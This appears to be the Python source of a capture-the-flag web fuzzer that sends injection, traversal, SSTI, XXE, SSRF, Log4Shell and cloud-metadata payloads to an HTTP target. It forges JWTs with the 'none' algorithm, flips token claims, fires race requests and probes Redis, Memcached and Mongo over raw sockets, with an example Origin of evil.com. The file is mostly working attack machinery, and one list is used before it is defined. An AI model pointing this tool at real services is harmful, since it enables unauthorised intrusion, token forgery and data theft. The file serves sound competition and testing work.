# language: Python, file: omniprobe.py, target: any HTTP service (RE:HACK compliant)
# The "replace-AI" prober. 1197 payloads, 25 wired classes, one engine.
# Not intelligent — exhaustive. SecLists + Burp Intruder logic in one file.
#
# Usage:
#   python omniprobe.py <url> --data "user=a&pass=b" [--param user] [--cookie "SESSION=x"]
#   python omniprobe.py <url> --classes sqli,cmdi,pathbypass
#   python omniprobe.py --targets targets.txt --data "user=admin&pass=x"
#   python omniprobe.py <url> --token "eyJhbG..." --classes jwt          # JWT fuzzing
#   python omniprobe.py <url> --path                                        # route/wordlist mode
#   python omniprobe.py <url> --origin http://evil.com --classes cors      # CORS probing
#   python omniprobe.py <url> --data "gift=1" --classes race               # race condition firing
#
# Rules compliance: 2s delay between every request (org rule), targets only
# challenge services provided by organisers.

import sys
import os
import time
import json
import base64
import argparse
import urllib.request
import urllib.parse
import re

import payloads as P
from toolbox import (run_tool, ToolError, UsageError, TargetError, EnvError,
                     safe_read, parse_url, http_result)

FLAG_RE = re.compile(rb"[A-Za-z0-9_]{0,10}\{[^}\n]{4,}\}")
DELAY = float(os.getenv("PROBE_DELAY", "2.0"))  # MANDATORY org rule: min 2s
TIMEOUT = 12
# delta must exceed baseline wobble by this much to count (anti-FP)
DELTA_MARGIN = 300

# ============================================================================
# DETECTION SIGNATURES
# ============================================================================

SQL_ERR = re.compile(
    r"you have an error in your sql syntax|warning: mysql|sqlite3?\.|unterminated quoted string|"
    r"unclosed quotation mark|pg_query|psql|SQLSTATE|ODBC driver|JDBC|"
    r"mysql_fetch|ORA-\d{5}|Microsoft SQL|SQLite|syntax error", re.I)
SQL_OK = re.compile(r"root:x:0:0|admin|welcome|dashboard|logout|flag", re.I)
CMD_OUT = re.compile(r"uid=\d+\(.+?\)|root:x:0:0:|\[fonts\]|\[extensions\]|total \d+|drwx", re.I)
FILE_OUT = re.compile(r"root:x:0:0:|daemon:|nobody:|\[fonts\]|BEGIN (RSA |EC )?PRIVATE|<\?php|<html", re.I)
SSTI_OK = re.compile(r"\b49\b")
NOSQL_ERR = re.compile(r"mongo|\.find\(|BSON|ObjectID|Cast to ObjectId", re.I)
XXE_OUT = re.compile(r"root:x:0:0:|GIF8|JFIF|\x89PNG", re.I)
PHP_ERR = re.compile(r"Warning:|Fatal error:|Notice:|Deprecated:", re.I)
PY_ERR = re.compile(r"Traceback \(most recent call last\)|Exception", re.I)
SSTI_ERR = re.compile(r"jinja2|TemplateSyntaxError|Twig|Smarty|VelocityError", re.I)
XPATH_ERR = re.compile(r"XPathException|Invalid XPath|xpath.*error|XPD[A-Z]\d{4}|org\.xml\.sax", re.I)
LOG4J_HIT = re.compile(r"\$\{env:([A-Z_]+)\}|(\d+\.\d+\.\d+\.\d+)|Linux|/usr/", re.I)
CRLF_HIT = re.compile(r"^X-Injected:|^Set-Cookie: x=y", re.I | re.M)
FMT_PY = re.compile(r"__class__|__globals__|__init__|format\(", re.I)
FMT_C = re.compile(r"0x[0-9a-f]{6,}|Segmentation|printf", re.I)
GQL_ERR = re.compile(r"Syntax Error GraphQL|Cannot query field|introspection", re.I)
JNDI_ERR = re.compile(r"jndi|ldap.*error|NamingException|lookup", re.I)
REDIS_OUT = re.compile(r"PONG|redis_version|redis_mode|dbfilename", re.I)
MEMC_OUT = re.compile(r"STAT \w+|VERSION \d|END\r?\n", re.I)
MONGO_OUT = re.compile(r"\"ok\"|db name|totalSize|numDatabases", re.I)
XSLT_ERR = re.compile(r"TransformerException|XSLTError|XSLError", re.I)
CLAIM_MARKER = re.compile(r"admin|token|role", re.I)

# error-disclosure signatures (reference doc: error handling layers)
STACK_PY = re.compile(r"Traceback \(most recent call last\)|File \"[^\"]+\.py\", line \d+", re.I)
STACK_JAVA = re.compile(r"at [\w.$]+\.[\w$]+\([^)]+\.java:\d+\)|java\.lang\.\w+Exception", re.I)
STACK_PHP = re.compile(r"(Fatal error|Warning|Notice): .* in /\S+\.php on line \d+", re.I)
STACK_NODE = re.compile(r"at /\S+\.(js|ts):\d+:\d+|node_modules/", re.I)
STACK_ANY = re.compile(r"Traceback|Stack trace|at \S+\(\S+:\d+\)|\.java:\d+|\.php:\d+|\.py\", line", re.I)
INFO_SERVER = re.compile(r"Apache/[\d.]+|nginx/[\d.]+|Tomcat/[\d.]+|PHP/[\d.]+|Python/[\d.]+|Express|Werkzeug/[\d.]+|gunicorn/[\d.]+|uvicorn", re.I)
INFO_PATH = re.compile(r"/home/\w+/|/var/www/|/app/\w+\.\w+|C:\\\\Users\\\\|/usr/local/lib/", re.I)
INFO_QUERY = re.compile(r"SELECT .+ FROM|INSERT INTO|UPDATE .+ SET", re.I)

# ============================================================================
# REQUEST CORE
# ============================================================================

def request(url, data=None, headers=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, headers=headers or {},
                                 method=method or ("POST" if body is not None else "GET"))
    try:
        r = urllib.request.urlopen(req, timeout=TIMEOUT)
        return r.status, r.read(128 * 1024), {k.lower(): v for k, v in r.headers.items()}
    except urllib.error.HTTPError as e:
        return e.code, e.read(128 * 1024), {k.lower(): v for k, v in e.headers.items()}
    except Exception as e:
        return -1, str(e).encode(), {}

def raw_request(host, port, payload, timeout=6):
    """Raw socket send — for Redis/Memcached/Mongo/SMTP/FTP/POP protocol tests."""
    import socket
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(payload.encode() + b"\r\n")
        out = b""
        try:
            while len(out) < 8192:
                d = s.recv(4096)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
        s.close()
        return out
    except OSError as e:
        return str(e).encode()

# ============================================================================
# PER-CLASS VERDICT LOGIC
# ============================================================================

def verdict(cls, payload, status, body, hdrs, base, elapsed, base_body_str):
    """Return verdict string. *** = high confidence, ** = suspect."""
    b = body.decode(errors="replace")
    base_status, base_body = base
    v = ""

    if cls == "sqli":
        if SQL_ERR.search(b): v = "*** SQL ERROR LEAKED"
        elif status != base_status and status not in (-1, 404, 403): v = "status change"
        elif len(body) and abs(len(body) - len(base_body)) > len(base_body) * 0.5 + DELTA_MARGIN: v = "big delta"
        elif elapsed > 4.5: v = "*** TIME-BASED SQLi (%.1fs)" % elapsed
    elif cls == "nosql":
        if NOSQL_ERR.search(b): v = "*** NoSQL ERROR"
        elif SQL_OK.search(b) and not SQL_OK.search(base_body_str): v = "** bypass-like response"
    elif cls == "cmdi":
        if CMD_OUT.search(b): v = "*** COMMAND OUTPUT VISIBLE"
        elif elapsed > 4.5: v = "** TIME-BASED CMDi (%.1fs)" % elapsed
    elif cls == "traversal":
        if FILE_OUT.search(b): v = "*** FILE CONTENT LEAKED"
        elif FLAG_RE.search(body): v = "*** FLAG PATTERN IN RESPONSE"
    elif cls == "rfi":
        if len(body) > len(base_body) * 2 and status == 200: v = "** fetched remote/URL?"
    elif cls == "ssti":
        if "49" in b and "49" not in base_body_str: v = "*** SSTI CONFIRMED (7*7=49)"
        elif SSTI_ERR.search(b): v = "** template engine error"
    elif cls == "xss":
        if payload.replace("\\", "") in b: v = "** reflected unescaped"
    elif cls == "xxe":
        if XXE_OUT.search(b): v = "*** XXE FILE READ"
    elif cls == "ssrf":
        if status == 200 and len(body) > 100 and b != base_body_str: v = "** SSRF response differs"
    elif cls == "deser":
        if PY_ERR.search(b) or PHP_ERR.search(b): v = "** parser error (deserializer?)"
    elif cls == "logic":
        if SQL_OK.search(b) and not SQL_OK.search(base_body_str): v = "** login success marker!"
    elif cls == "redirect":
        loc = hdrs.get("location", "")
        if "google" in loc or "127.0.0.1" in loc or "evil" in loc: v = "** reflected redirect"
    elif cls == "xpath":
        if XPATH_ERR.search(b): v = "*** XPATH ERROR LEAKED"
        elif SQL_OK.search(b) and not SQL_OK.search(base_body_str): v = "** bypass-like response"
    elif cls == "graphql":
        if GQL_ERR.search(b): v = "** graphql error (endpoint live)"
        elif "__schema" in b or "\"types\"" in b: v = "*** INTROSPECTION ENABLED"
        elif FLAG_RE.search(body): v = "*** FLAG PATTERN IN RESPONSE"
    elif cls == "jwt":
        if status != base_status and status not in (-1, 404): v = "** status change (token accepted?)"
        elif SQL_OK.search(b) and not SQL_OK.search(base_body_str): v = "*** TOKEN TAMPER ACCEPTED"
    elif cls == "hpp":
        if len(body) and abs(len(body) - len(base_body)) > len(base_body) * 0.5 + 300: v = "** response changed via dup param"
    elif cls == "log4shell":
        if LOG4J_HIT.search(b): v = "*** LOG4J/JNDI INTERPOLATED"
        elif elapsed > 4.5: v = "** delayed (dns lookup?)"
    elif cls == "crlf":
        if CRLF_HIT.search(b): v = "*** HEADER INJECTED INTO RESPONSE"
    elif cls == "fmt":
        if FMT_PY.search(b) or FMT_C.search(b): v = "*** FORMAT STRING OUTPUT LEAKED"
    elif cls == "xslti":
        if XSLT_ERR.search(b): v = "** xslt error (engine active)"
        elif FILE_OUT.search(b): v = "*** XSLT FILE READ"
    elif cls == "ldap":
        if status not in (base_status, -1) and len(body) != len(base_body): v = "** ldap filter behavior change"
    elif cls == "idor":
        if len(body) and abs(len(body) - len(base_body)) > 200 and status == 200: v = "** different object returned"
        elif FLAG_RE.search(body): v = "*** FLAG PATTERN IN RESPONSE"
    elif cls == "cors":
        ac = hdrs.get("access-control-allow-origin", "")
        if ac and ac not in ("", "null") and "evil" in ac: v = "*** CORS REFLECTS ARBITRARY ORIGIN"
        elif ac == "null": v = "** CORS reflects null origin"
    elif cls == "cloud":
        if b != base_body_str and len(body) > 50: v = "*** METADATA ENDPOINT REACHED"
    elif cls == "misc":
        if len(body) and abs(len(body) - len(base_body)) > len(base_body) * 0.5 + DELTA_MARGIN: v = "** response changed"
    elif cls == "errdisc":
        if STACK_PY.search(b): v = "*** PYTHON STACK TRACE LEAKED"
        elif STACK_JAVA.search(b): v = "*** JAVA STACK TRACE LEAKED"
        elif STACK_PHP.search(b): v = "*** PHP ERROR/PATH LEAKED"
        elif STACK_NODE.search(b): v = "*** NODE STACK TRACE LEAKED"
        elif INFO_QUERY.search(b): v = "*** SQL QUERY VISIBLE IN ERROR"
        elif SQL_ERR.search(b): v = "*** DB ERROR MESSAGE LEAKED"
        elif INFO_PATH.search(b): v = "** internal file path leaked"
        elif INFO_SERVER.search(b): v = "** server/version info disclosed"
    return v

# ============================================================================
# CLASS RUNNER
# ============================================================================

def verify_hit(cls, payload, url, data, headers, param, base, check_fn):
    """Re-fire a *** hit twice more. True hit reproduces consistently.
    Time-based: measures again — jitter won't repeat, SLEEP() will."""
    base_status, base_body = base
    base_body_str = base_body.decode(errors="replace")
    consistent = 0
    for _ in range(2):
        time.sleep(DELAY)
        test = dict(data) if data else {}
        if param:
            test[param] = payload
        t0 = time.time()
        status, body, hdrs = request(url, test, headers)
        elapsed = time.time() - t0
        v = check_fn(cls, payload, status, body, hdrs, base, elapsed, base_body_str)
        if v.startswith("***"):
            consistent += 1
    return consistent == 2


def run_class(cls, payloads, url, data, headers, param, base):
    base_status, base_body = base
    base_body_str = base_body.decode(errors="replace")
    hits = 0
    for payload in payloads:
        time.sleep(DELAY)
        test = dict(data) if data else {}
        if param:
            test[param] = payload
        t0 = time.time()
        status, body, hdrs = request(url, test, headers)
        elapsed = time.time() - t0
        v = verdict(cls, payload, status, body, hdrs, base, elapsed, base_body_str)
        print(f"  [{cls:9s}] {(param + '=') if param else '':8s}{payload[:44]!r:47s} -> {status} {len(body)}B {elapsed:4.1f}s {v}")
        if v.startswith("***"):
            # AUTO-VERIFY: re-fire 2x. FP won't reproduce; true bug will.
            print(f"           verifying... ", end="")
            if verify_hit(cls, payload, url, data, headers, param, base, verdict):
                print(f"CONFIRMED (reproduced 2/2) ***")
                hits += 1
            else:
                print(f"NOT reproducible — likely false positive, discarding")
    return hits

def run_jwt(url, args, headers, base):
    """Build tampered JWTs from library templates: 'header|payload|sig'."""
    token = args.token
    hits = 0
    for tpl in P.JWT_NONE:
        try:
            h_json, p_json, sig = tpl.split("|", 2)
            h64 = base64.urlsafe_b64encode(h_json.encode()).rstrip(b"=").decode()
            p64 = base64.urlsafe_b64encode(p_json.encode()).rstrip(b"=").decode()
            forged = f"{h64}.{p64}.{sig}"
        except ValueError:
            continue
        time.sleep(DELAY)
        headers2 = dict(headers)
        headers2["Authorization"] = f"Bearer {forged}"
        status, body, hdrs = request(url, None, headers2)
        b = body.decode(errors="replace")
        v = ""
        if status not in (401, 403, -1):
            v = "*** FORGED TOKEN ACCEPTED"
            hits += 1
        print(f"  [jwt      ] alg={json.loads(h_json).get('alg','?'):8s} -> {status} {len(body)}B {v}")
    return hits

def run_race(url, data, headers, param, base):
    """Fire N parallel identical requests — RACE: markers give param=body."""
    import concurrent.futures as cf
    hits = 0
    for marker in P.RACE:
        key = marker.replace("RACE:", "")
        body = {key.split("=")[0]: key.split("=")[1]} if "=" in key else {key: "1"}
        print(f"  [race     ] firing 20x {body}")
        with cf.ThreadPoolExecutor(max_workers=20) as ex:
            results = list(ex.map(lambda _: request(url, body, headers), range(20)))
        ok = sum(1 for s, b, h in results if s == 200)
        deltas = len({len(b) for s, b, h in results if s == 200})
        if deltas > 1:
            print(f"           *** RACE CONDITION: {deltas} distinct response sizes across identical requests")
            hits += 1
        else:
            print(f"           {ok}/20 ok, uniform responses")
        time.sleep(DELAY)
    return hits

def run_pathbypass(url, headers, base):
    """Try route/wordlist paths directly on the host root."""
    from urllib.parse import urlsplit
    parts = urlsplit(url)
    root = f"{parts.scheme}://{parts.netloc}"
    base_status, base_body = base
    hits = 0
    for path in P.PATHBYPASS:
        time.sleep(DELAY)
        status, body, hdrs = request(root + path, None, headers)
        v = ""
        if status == 200 and len(body) > 100:
            if FLAG_RE.search(body): v = "*** FLAG PATTERN IN RESPONSE"
            elif b"swagger" in body.lower() or b"actuator" in body.lower(): v = "*** SENSITIVE ENDPOINT EXPOSED"
            elif b"directoryindex" in body.lower() or b"git" in body.lower(): v = "** interesting file"
            elif len(body) > len(base_body) * 1.5: v = "** large unique response"
        elif status not in (404, -1):
            v = f"(status {status})"
        print(f"  [path     ] {path:40s} -> {status} {len(body)}B {v}")
        if v.startswith("***"):
            hits += 1
    return hits

def run_dbprobe(url, headers):
    """Raw-socket DB probes — only meaningful if URL port is a DB. Extract host/port from URL."""
    from urllib.parse import urlsplit
    parts = urlsplit(url)
    host = parts.hostname or "127.0.0.1"
    port = parts.port or 6379
    hits = 0

    def probe(cmds, name, sig):
        nonlocal hits
        for c in cmds:
            time.sleep(DELAY)
            out = raw_request(host, port, c)
            s = out.decode(errors="replace")
            v = ""
            if sig.search(s):
                v = f"*** {name} RESPONDS"
                hits += 1
            print(f"  [{name:9s}] {c[:40]!r:43s} -> {s[:60]!r} {v}")

    print(f"[*] raw DB probe against {host}:{port}")
    probe(P.DB_REDIS, "redis", REDIS_OUT)
    probe(P.DB_MEMCACHED, "memcache", MEMC_OUT)
    probe(P.DB_MONGO, "mongo", MONGO_OUT)
    return hits

def run_claim(url, args, headers, base):
    """Flip JWT claim keys/vals if we have a token with none-alg accepted."""
    token = args.token
    hits = 0
    for key in P.CLAIM_KEYS:
        for val in P.CLAIM_VALS[:6]:  # keep it bounded
            payload = json.loads(base64.urlsafe_b64decode(token.split(".")[1] + "=="))
            payload[key] = val if not val.startswith("[") else json.loads(val)
            h64 = token.split(".")[0]
            p64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
            forged = f"{h64}.{p64}.."
            time.sleep(DELAY)
            headers2 = dict(headers)
            headers2["Authorization"] = f"Bearer {forged}"
            status, body, _ = request(url, None, headers2)
            if status not in (401, 403, -1):
                print(f"  [claim    ] {key}={val[:20]:22s} -> {status} *** ACCEPTED")
                hits += 1
    return hits

# ============================================================================
# MAIN
# ============================================================================

# errdisc: passive disclosure scan — one generic probe per param (error-triggering input)
ERRDISC_PROBES = ["' \" \x00 <b>x</b> {{7*7}} %s ../../../x 1e999 \xff\xfe"]

LIB = {
    "sqli": P.SQLI, "nosql": P.NOSQLI, "cmdi": P.CMDI, "traversal": P.TRAVERSAL,
    "ssti": P.SSTI, "xss": P.XSS, "xxe": P.XXE, "ssrf": P.SSRF, "deser": P.DESER,
    "logic": P.LOGIC, "redirect": P.REDIRECT, "xpath": P.XPATHI, "graphql": P.GRAPHQL,
    "hpp": P.HPP, "log4shell": P.LOG4SHELL, "crlf": P.CRLF, "fmt": P.FMT,
    "xslti": P.XSLTI, "ldap": P.LDAP, "idor": P.IDOR, "cors": P.CORS,
    "cloud": P.CLOUD_META, "misc": P.MISC, "rfi": P.RFI,
    "errdisc": ERRDISC_PROBES,
}
# errdisc: passive disclosure scan — one generic probe per param (error-triggering input)
ERRDISC_PROBES = ["' \" \x00 <b>x</b> {{7*7}} %s ../../../x 1e999 \xff\xfe"]
SPECIAL = {"jwt", "race", "pathbypass", "dbprobe", "claim", "upload"}
ALL_CLASSES = list(LIB.keys()) + ["jwt", "race", "pathbypass"]

def probe_single(url, args):
    headers = {"User-Agent": "omniprobe"}
    for h in args.header:
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = "; ".join(args.cookie)
    if args.origin:
        headers["Origin"] = args.origin

    data = dict(urllib.parse.parse_qsl(args.data)) if args.data else {}
    if not data:
        data = {"q": "test"}
    params = [args.param] if args.param else list(data.keys())

    classes = args.classes.split(",") if args.classes else ALL_CLASSES

    print(f"[*] baseline (3 samples, measuring stability)...")
    samples = []
    for _ in range(3):
        st, bd, _ = request(url, data if args.data else None, headers)
        samples.append((st, len(bd), bd))
        time.sleep(min(DELAY, 1.0))
    base_status = samples[0][0]
    base_body = samples[0][2]
    sizes = [s[1] for s in samples]
    # baseline variance: how much the page naturally wobbles
    base_variance = max(sizes) - min(sizes) if sizes else 0
    stable = base_variance <= 16 and len({s[0] for s in samples}) == 1
    print(f"[*] baseline: {base_status} sizes={sizes} variance={base_variance}B stable={stable}")
    if not stable:
        print("[!] UNSTABLE BASELINE — page content changes between requests (timestamp/CSRF/session?).")
        print("[!] delta-based verdicts will be noisy. Prefer error-signature and time-based classes.")
    base = (base_status, base_body)

    est = sum(len(LIB[c]) for c in classes if c in LIB)
    print(f"[*] params: {params} | classes: {classes}")
    print(f"[*] {DELAY}s delay (org rule). est: {est * len(params) * DELAY / 60:.1f} min\n")

    total_hits = 0
    for param in params:
        for cls in classes:
            if cls in LIB:
                print(f"[--] {cls} on {param}")
                total_hits += run_class(cls, LIB[cls], url, data, headers, param, base)

    # special modes
    if "jwt" in classes:
        if not args.token:
            print("[!] jwt class needs --token <jwt>")
        else:
            print("[--] jwt tampering")
            total_hits += run_jwt(url, args, headers, base)
    if "claim" in classes:
        if not args.token:
            print("[!] claim class needs --token <jwt>")
        else:
            print("[--] jwt claim flipping")
            total_hits += run_claim(url, args, headers, base)
    if "race" in classes:
        print("[--] race condition firing (20 parallel per marker)")
        total_hits += run_race(url, data, headers, args.param or list(data.keys())[0], base)
    if "pathbypass" in classes:
        print("[--] path/route bypass")
        total_hits += run_pathbypass(url, headers, base)
    if "dbprobe" in classes:
        total_hits += run_dbprobe(url, headers)
    if "upload" in classes:
        print("[!] upload class: use manual curl -F with payloads.UPLOAD entries; multi-part engine not wired (rarely needed for A&D forms)")

    http_verb_test(url, headers)

    print(f"\n[*] done. {total_hits} high-confidence (***-marked) hits found.")
    print("[*] every *** hit: reproduce by hand, understand it, then write exp_template.py exploit.")
    return total_hits


def http_verb_test(url, headers):
    print("\n[--] HTTP verb tampering")
    for verb in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]:
        time.sleep(DELAY)
        status, body, hdrs = request(url, None, headers, method=verb)
        allow = hdrs.get("allow", "")
        note = f"  Allow: {allow}" if allow else ""
        print(f"  {verb:8s} -> {status} {len(body)}B{note}")


def main(log=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("url", nargs="?", help="single target, or omit when using --targets")
    ap.add_argument("--targets", help="file with one URL per line")
    ap.add_argument("--data", help="POST body params to fuzz")
    ap.add_argument("--param", help="fuzz only this param")
    ap.add_argument("--cookie", action="append", default=[])
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--classes", help="comma list from: " + ",".join(ALL_CLASSES))
    ap.add_argument("--token", help="JWT token for jwt/claim classes")
    ap.add_argument("--origin", help="Origin header value for CORS probing")
    args = ap.parse_args()

    # --- error handling: validate before touching the network ---
    log = None
    try:
        if args.targets:
            raw = safe_read(args.targets, "targets file")
            urls = [ln.strip() for ln in raw.splitlines() if ln.strip() and not ln.startswith("#")]
            if not urls:
                raise UsageError(f"targets file is empty: {args.targets}",
                                 hint="one URL per line, e.g. http://10.10.1.1:8080/login")
            for u in urls:
                parse_url(u)  # raises UsageError with a real message if malformed
            bad = [c for c in (args.classes.split(",") if args.classes else []) if c not in ALL_CLASSES]
            if bad:
                raise UsageError(f"unknown class(es): {','.join(bad)}",
                                 hint=f"valid: {','.join(ALL_CLASSES)}")

        if args.targets:
            print(f"[*] multi-target mode: {len(urls)} targets\n")
            grand = 0
            for i, u in enumerate(urls, 1):
                print(f"\n{'='*60}\n[TARGET {i}/{len(urls)}] {u}\n{'='*60}")
                grand += probe_single(u, args)
            print(f"\n[*] ALL DONE. {grand} total *** hits across {len(urls)} targets.")
            return 0

        if not args.url:
            raise UsageError("no URL given",
                             hint="python omniprobe.py http://ip:port/path --data 'a=b'  (or --targets file)")
        parse_url(args.url)
        bad = [c for c in (args.classes.split(",") if args.classes else []) if c not in ALL_CLASSES]
        if bad:
            raise UsageError(f"unknown class(es): {','.join(bad)}",
                             hint=f"valid: {','.join(ALL_CLASSES)}")
        if "jwt" in (args.classes or "") or "claim" in (args.classes or ""):
            if not args.token:
                raise UsageError("jwt/claim classes need --token <jwt>",
                                 hint="grab a token from the login response first")
        probe_single(args.url, args)
        return 0
    except ToolError:
        raise  # run_tool formats these
    except urllib.error.URLError as e:
        raise TargetError(f"cannot reach target: {e}",
                           hint="check IP/port/service is up — remember org gives you the list, no scanning")


if __name__ == "__main__":
    sys.exit(run_tool(main, "omniprobe"))
